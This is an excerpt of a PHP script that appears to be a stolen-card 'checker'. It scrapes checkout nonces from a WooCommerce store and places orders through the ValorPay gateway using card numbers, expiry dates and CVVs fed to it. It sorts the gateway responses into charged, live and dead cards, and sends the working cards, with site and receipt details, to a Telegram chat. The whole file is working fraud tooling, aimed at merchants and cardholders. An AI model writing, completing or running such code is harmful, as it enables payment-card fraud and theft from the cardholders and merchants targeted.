...
$bnonce = GetStr($Checkout, '"bl_ajax_nonce":"','"');
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$hostname/?wc-ajax=valorpay_bin_lookup");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: */*',
...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'nonce='.$bnonce.'&client_token='.$kav.'&bin='.$cc6.'');
$namo = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'billing_phone' => $phone,
    'billing_email' => $email,
    'payment_method' => 'wc_valorpay',
    'wc-authorize-net-aim-card-type' => $brand,
    'wc_valorpay-card-number' => $cc,
    'wc_valorpay-card-expiry' => $mes . ' / ' . $ano,
    'wc_valorpay-card-cvc' => $cvv,
    'valorpay_avs_type' => 'zipandaddress',
    'valorpay_avs_zip' => $zip,
    'valorpay_avs_street' => $street,
    'valorpay_terms' => 'on',
    'terms' => 'on',
    'terms-field' => '1',
...
$pepe = curl_exec($ch);
$ro2 = json_decode($pepe, true);;
$result = $ro2['result'];
$msg = strip_tags($ro2['messages']);
$url = $ro2['redirect'];
$url = str_replace('\\', '', $url);
$od = $ro2['order_id'];
...
if ($result === 'success') { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED VALORPAY]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

} else {
    if (strpos($msg, 'Payment error: CVV data is not correct ( Error code :82 )') !== false) {
    ...
    <span style="color: #ffe609ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   

          $telegramMessage = "[#CCN]- $lista [CCN LIVE VALORPAY]
    \n[$hostname1]\n";
 
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

} elseif (strpos($msg, 'Payment error: CVV2 Value supplied is invalid ( Error code :N7 ') !== false) {
...
} elseif (strpos($msg, 'Payment error: Insufficient funds ( Error code :51 )') !== false) {


        echo '<span style="color: #ffffffff; padding: 8px;"> #CVV [INSUFFICIENT FUNDS][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff7809ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   

} elseif (strpos($msg, 'Payment error: PROCESSING ERROR ( TOO MANY FAILED REQUEST )') !== false) {

    echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [PAYMENT ERROR TOO MANY FAILED REQUEST][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
   
} else {
    echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD ['.$msg.'][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
